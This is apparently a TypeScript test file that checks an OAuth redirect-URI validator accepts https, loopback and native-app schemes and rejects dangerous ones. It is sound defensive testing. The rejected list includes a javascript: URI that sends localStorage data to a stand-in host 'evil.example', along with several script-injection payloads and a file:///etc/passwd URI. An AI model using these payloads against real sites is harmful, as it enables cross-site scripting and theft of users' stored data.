import { describe, expect, it } from 'bun:test';
import { isAllowedRedirectUri, isWebUrl } from './oauth-redirect-uri';

describe('isAllowedRedirectUri', () => {
  it('accepts https, loopback http and native-app schemes', () => {
    for (const uri of [
      'https://claude.ai/api/mcp/auth_callback',
      'http://localhost:9999/callback',
      'http://127.0.0.1:33418/cb',
      'http://[::1]:8080/cb',
      'http://app.localhost/cb',
      'claude://oauth/callback',
      'com.example.app:/oauth2redirect',
    ]) {
      expect(isAllowedRedirectUri(uri)).toBe(true);
    }
  });

  it('refuses script and content schemes, remote http and fragments', () => {
    for (const uri of [
      "javascript:void(0)||fetch('https://evil.example/'+localStorage.x)//",
      'JavaScript:alert(1)',
      'data:text/html,<script>alert(1)</script>',
      'vbscript:msgbox(1)',
      'file:///etc/passwd',
      'blob:https://inkweld.app/1234',
      'http://evil.example/callback',
      'http://192.168.1.10/cb',
      'https://client.example/cb#fragment',
      'not a url',
    ]) {
      expect(isAllowedRedirectUri(uri)).toBe(false);
    }
  });
});

describe('isWebUrl', () => {
  it('accepts only http(s)', () => {
    expect(isWebUrl('https://client.example')).toBe(true);
    expect(isWebUrl('http://client.example/logo.png')).toBe(true);
    expect(isWebUrl('javascript:alert(1)')).toBe(false);
    expect(isWebUrl('data:image/svg+xml,<svg/>')).toBe(false);
  });
});
